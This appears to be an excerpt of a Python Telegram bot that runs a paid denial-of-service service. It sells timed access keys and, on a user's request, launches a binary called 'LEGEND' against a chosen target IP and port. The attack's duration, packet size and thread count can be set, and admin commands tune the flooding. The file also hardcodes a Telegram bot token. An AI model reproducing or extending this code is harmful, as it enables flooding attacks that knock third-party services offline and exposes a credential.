...
ADMIN_IDS = [1929943036, 1929943036]
BOT_TOKEN = "7654306077:AAGmLTy-NhzPfAy9XbAcKFZlr4sIpATO4jY"
thread_count = 50
packet_size = 9
...
def calculate_key_price(amount: int, time_unit: str) -> float:
    """Calculate the price for a key based on new pricing structure"""
    key_name = f"{amount}days"  # Convert amount into format like '1day', '2days'
    
    # Get the price from the updated KEY_PRICES dictionary
    return KEY_PRICES.get(key_name, 0)
...
def process_packet_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, f"*Packet size set to {packet_size} for LEGEND.*", parse_mode='Markdown')
...
def process_thread_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, f"*Thread count set to {thread_count} for LEGEND.*", parse_mode='Markdown')
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        # Construct command for LEGEND binary with thread count and packet size
        command = f"./LEGEND {target_ip} {target_port} {duration} {packet_size} {thread_count}"
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @NeoModEngine"  
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By @NeoModEngine\n\n"
            f"Admin Commands:\n"
        ...
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! Developed By @NeoModEngine\n\n"
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @NeoModEngine*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @NeoModEngine.*", parse_mode='Markdown')
        return
    ...
    if is_super_admin(user_id):
        ...
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
                ...
                "Contact @NeoModEngine for assistance."
            )
        else:
            account_info = (
        ...
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @NeoModEngine."
